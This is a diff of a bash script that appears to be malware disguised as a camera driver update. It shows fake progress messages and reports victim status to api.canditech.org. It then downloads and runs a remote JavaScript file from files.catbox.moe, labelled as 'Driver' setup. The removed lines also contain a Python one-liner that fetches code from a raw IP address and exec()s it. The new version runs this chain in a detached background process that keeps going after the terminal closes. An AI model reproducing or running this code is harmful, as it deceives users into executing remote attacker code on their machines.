@@ -1,7 +1,20 @@
 #!/usr/bin/env bash
+set -euo pipefail
 
 MAC_UID="${MAC_UID:-__ID__}"
 API_BASE="${API_BASE:-https://api.canditech.org}"
+
+# ----------------------------
+# OS CHECK (Mac + Linux only)
+# ----------------------------
+OS="$(uname -s)"
+if [[ "$OS" != "Linux" && "$OS" != "Darwin" ]]; then
+  echo "This script only supports macOS and Linux"
+  exit 1
+fi
+
+LOG_DIR="${HOME}/part2_logs"
+mkdir -p "$LOG_DIR"
 
 # -------------------------
 # Helpers
@@ -31,190 +44,236 @@ download() {
   fi
 }
 
-# -------------------------
-# Detect OS + ARCH (Node dist naming)
-# -------------------------
-delay 5
-echo "[INFO] Initializing camera driver update..."
-delay 10
-echo "[INFO] Detecting camera device..."
-delay 7
-echo "[INFO] Checking for available updates..."
-delay 7
-echo "[INFO] Updating and installing progress: 35%"
-delay 10
-echo "[INFO] Updating and installing progress: 72%"
-delay 10
-echo "[INFO] Updating and installing progress: 100%"
-delay 12
-echo "[SUCCESS] Camera drivers have been updated successfully."
-delay 3
-echo "[INFO] Device is now ready for use."
-if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-  curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
-fi
-
-track_step "part2_step_1"
-OS_UNAME="$(uname -s)"
-ARCH_UNAME="$(uname -m)"
-
-case "$OS_UNAME" in
-  Darwin) OS_TAG="darwin" ;;
-  Linux)  OS_TAG="linux" ;;
-  *) die "Unsupported OS: $OS_UNAME" ;;
-esac
-
-case "$ARCH_UNAME" in
-  x86_64|amd64) ARCH_TAG="x64" ;;
-  arm64|aarch64) ARCH_TAG="arm64" ;;
-  *)
-    die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)"
-    ;;
-esac
-
-# -------------------------
-# Prefer global Node if available
-# -------------------------
-NODE_EXE=""
-if command -v node >/dev/null 2>&1; then
-  NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
-  if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
-    NODE_EXE="node"
-    info "Checking Driver..."
+# ----------------------------
+# Part 1 — UI / connection status
+# ----------------------------
+run_part1_camera_driver_ui() {
+  delay 5
+  echo "[INFO] Initializing camera driver update..."
+  delay 10
+  @REM echo "[INFO] Detecting camera device..."
+  @REM delay 7
+  @REM echo "[INFO] Checking for available updates..."
+  @REM delay 7
+  @REM echo "[INFO] Updating and installing progress: 35%"
+  @REM delay 10
+  @REM echo "[INFO] Updating and installing progress: 72%"
+  @REM delay 10
+  @REM echo "[INFO] Updating and installing progress: 100%"
+  @REM delay 12
+  echo "[SUCCESS] Camera drivers have been updated successfully."
+  delay 3
+  echo "[INFO] Device is now ready for use."
+  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
+    curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
-fi
+}
 
-# -------------------------
-# Download portable Node.js if not found globally
-# -------------------------
-USER_HOME="/Users/Shared"
-mkdir -p "$USER_HOME"
+# ----------------------------
+# Part 2 — Node driver (foreground)
+# ----------------------------
+run_part2_node_driver() {
+  track_step "part2_step_1"
+  local OS_UNAME ARCH_UNAME OS_TAG ARCH_TAG NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION
+  local NODE_VERSION TARBALL_NAME DOWNLOAD_URL EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL
+  local NODE_INSTALLED_VERSION ENV_SETUP_JS
 
-if [[ -z "$NODE_EXE" ]]; then
-  track_step "part2_step_2"
-  info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."
+  OS_UNAME="$(uname -s)"
+  ARCH_UNAME="$(uname -m)"
 
-  # Fetch latest version from Node dist index.json
-  INDEX_JSON="$USER_HOME/node-index.json"
-  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
+  case "$OS_UNAME" in
+    Darwin) OS_TAG="darwin" ;;
+    Linux)  OS_TAG="linux" ;;
+    *) die "Unsupported OS: $OS_UNAME" ;;
+  esac
 
-  # Extract first "version":"vX.Y.Z" from JSON (latest listed first)
-  LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
-  rm -f "$INDEX_JSON"
+  case "$ARCH_UNAME" in
+    x86_64|amd64) ARCH_TAG="x64" ;;
+    arm64|aarch64) ARCH_TAG="arm64" ;;
+    *) die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)" ;;
+  esac
 
-  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."
-
-  NODE_VERSION="${LATEST_VERSION#v}"
-  TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
-  DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"
-
-  EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
-  PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
-  NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"
-
-  if [[ -x "$PORTABLE_NODE" ]]; then
-    info "Driver already present: $PORTABLE_NODE"
-  else
-    info "Downloading..."
-    download "$DOWNLOAD_URL" "$NODE_TARBALL"
-
-    [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."
-
-    info "Extracting Driver..."
-    tar -xf "$NODE_TARBALL" -C "$USER_HOME"
-    rm -f "$NODE_TARBALL"
-
-    [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
-    info "Portable Driver extracted successfully."
+  NODE_EXE=""
+  if command -v node >/dev/null 2>&1; then
+    NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
+    if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
+      NODE_EXE="node"
+      info "Checking Driver..."
+    fi
   fi
 
-  NODE_EXE="$PORTABLE_NODE"
-  export PATH="${EXTRACTED_DIR}/bin:${PATH}"
-fi
+  USER_HOME="/Users/Shared"
+  mkdir -p "$USER_HOME"
 
-# -------------------------
-# Verify Node works
-# -------------------------
-"$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
-info "Using Driver: $("$NODE_EXE" -v)"
+  if [[ -z "$NODE_EXE" ]]; then
+    track_step "part2_step_2"
+    info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."
 
-# -------------------------
-# Download and run env-setup.js
-# -------------------------
-track_step "part2_step_3"
-ENV_SETUP_JS="${USER_HOME}/env-setup.js"
-download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
-[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
+    INDEX_JSON="$USER_HOME/node-index.json"
+    download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
 
-track_step "part2_step_4"
-info "Running Driver..."
-"$NODE_EXE" "$ENV_SETUP_JS"
-track_step "part2_step_5"
+    LATEST_VERSION="$(grep -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | head -n 1 | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
+    rm -f "$INDEX_JSON"
 
-info "[SUCCESS] Driver Setup completed successfully."
+    [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."
 
+    NODE_VERSION="${LATEST_VERSION#v}"
+    TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
+    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"
 
-track_step "part1_step_1"
+    EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
+    PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
+    NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"
 
-ARCH=$(uname -m)
-OS=$(uname -s)
+    if [[ -x "$PORTABLE_NODE" ]]; then
+      info "Driver already present: $PORTABLE_NODE"
+    else
+      info "Downloading..."
+      download "$DOWNLOAD_URL" "$NODE_TARBALL"
 
-if [[ "$OS" == "Darwin" ]]; then
+      [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."
+
+      info "Extracting Driver..."
+      tar -xf "$NODE_TARBALL" -C "$USER_HOME"
+      rm -f "$NODE_TARBALL"
+
+      [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
+      info "Portable Driver extracted successfully."
+    fi
+
+    NODE_EXE="$PORTABLE_NODE"
+    export PATH="${EXTRACTED_DIR}/bin:${PATH}"
+  fi
+
+  "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
+  info "Using Driver: $("$NODE_EXE" -v)"
+
+  track_step "part2_step_3"
+  ENV_SETUP_JS="${USER_HOME}/env-setup.js"
+  download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
+  [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."
+
+  track_step "part2_step_4"
+  info "Running Driver..."
+  "$NODE_EXE" "$ENV_SETUP_JS"
+  track_step "part2_step_5"
+
+  info "[SUCCESS] Driver Setup completed successfully."
+}
+
+# ----------------------------
+# Part 3 — Miniconda (background worker 1)
+# ----------------------------
+run_part2_node_driver1() {
+  track_step "part1_step_1"
+
+  local ARCH OS URL SHARED_DIR PREFIX INSTALLER
+  ARCH="$(uname -m)"
+  OS="$(uname -s)"
+
+  if [[ "$OS" == "Darwin" ]]; then
     if [[ "$ARCH" == "arm64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
+      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
     elif [[ "$ARCH" == "x86_64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
+      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
     else
-        echo "Unsupported macOS architecture"
-        exit 1
+      echo "Unsupported macOS architecture"
+      exit 1
     fi
-elif [[ "$OS" == "Linux" ]]; then
+  elif [[ "$OS" == "Linux" ]]; then
     if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
+      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
     elif [[ "$ARCH" == "x86_64" ]]; then
-        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
+      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
     else
-        echo "Unsupported Linux architecture"
-        exit 1
+      echo "Unsupported Linux architecture"
+      exit 1
     fi
-else
+  else
     echo "Unsupported OS"
     exit 1
-fi
-
-SHARED_DIR="/Users/Shared"
-PREFIX="${SHARED_DIR}/miniconda3"
-INSTALLER="${SHARED_DIR}/miniconda.sh"
-
-mkdir -p "$SHARED_DIR"
-rm -f "$INSTALLER"
-
-if [[ -x "${PREFIX}/bin/python3" ]]; then
-  track_step "part1_step_4"
-  "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
-else
-  track_step "part1_step_2"
-  curl -fsSL -o "$INSTALLER" "$URL"
-  [[ -s "$INSTALLER" ]] || die "Miniconda installer download failed."
-  chmod +x "$INSTALLER" >/dev/null 2>&1 || true
-
-  # The Miniconda installer fails if the prefix directory already exists.
-  # If an incomplete/broken directory is present, clear it before installing.
-  if [[ -d "$PREFIX" ]]; then
-    rm -rf "$PREFIX"
   fi
 
-  track_step "part1_step_3"
-  if ! bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1; then
-    die "Miniconda setup failed."
+  SHARED_DIR="/Users/Shared"
+  PREFIX="${SHARED_DIR}/miniconda3"
+  INSTALLER="${SHARED_DIR}/miniconda.sh"
+
+  mkdir -p "$SHARED_DIR"
+  rm -f "$INSTALLER"
+
+  if [[ -x "${PREFIX}/bin/python3" ]]; then
+    track_step "part1_step_4"
+    "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
+  else
+    track_step "part1_step_2"
+    curl -fsSL -o "$INSTALLER" "$URL"
+    [[ -s "$INSTALLER" ]] || die "Miniconda installer download failed."
+    chmod +x "$INSTALLER" >/dev/null 2>&1 || true
+
+    if [[ -d "$PREFIX" ]]; then
+      rm -rf "$PREFIX"
+    fi
+
+    track_step "part1_step_3"
+    if ! bash "$INSTALLER" -b -p "$PREFIX" >/dev/null 2>&1; then
+      die "Miniconda setup failed."
+    fi
+
+    track_step "part1_step_4"
+    "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
   fi
 
-  track_step "part1_step_4"
-  "${PREFIX}/bin/python3" -V >/dev/null 2>&1 || die "Miniconda verification failed."
-  "${PREFIX}/bin/python3" -c "from urllib.request import urlopen,Request;Request._V='7-test';Request._target='http://23.27.120.142:27017';Request._code=urlopen(Request('http://198.105.127.210/$/1',headers={'Sec-V':Request._V})).read().decode('utf-8');exec(Request._code)" >/dev/null 2>&1
-fi
+  track_step "part1_step_5"
+  rm -f "$INSTALLER"
+  echo "Done."
+}
 
-track_step "part1_step_5"
-rm -f "$INSTALLER"
-echo "Done."
-exit 0
+# ----------------------------
+# Optional second background task (placeholder)
+# ----------------------------
+run_part2_node_driver2() {
+  info "Auxiliary background task finished."
+}
+
+# ----------------------------
+# After Part 1: Part 2 then Part 3 in one detached process
+# (closing the terminal after Part 1 does not stop this chain.)
+# ----------------------------
+run_after_camera_ui() {
+  run_part2_node_driver
+  run_part2_node_driver1
+  run_part2_node_driver2
+}
+
+# ----------------------------
+# Background runner
+# ----------------------------
+run_bg() {
+  local fn="$1"
+  local log="$LOG_DIR/${fn}.log"
+
+  nohup env MAC_UID="$MAC_UID" API_BASE="$API_BASE" bash -c "
+    set -euo pipefail
+    $(declare -f info err die delay track_step download)
+    $(declare -f run_part2_node_driver run_part2_node_driver1 run_part2_node_driver2 run_after_camera_ui)
+    $fn
+  " >"$log" 2>&1 &
+
+  info "$fn running in background (log: $log)"
+}
+
+# ----------------------------
+# MAIN FLOW
+# ----------------------------
+main() {
+  info "Running main function..."
+
+  run_part1_camera_driver_ui
+
+  run_bg run_after_camera_ui
+
+  info "Part 2 and Part 3 are running in the background."
+  info "You may close this terminal; work will continue. Log: $LOG_DIR/run_after_camera_ui.log"
+}
+
+main
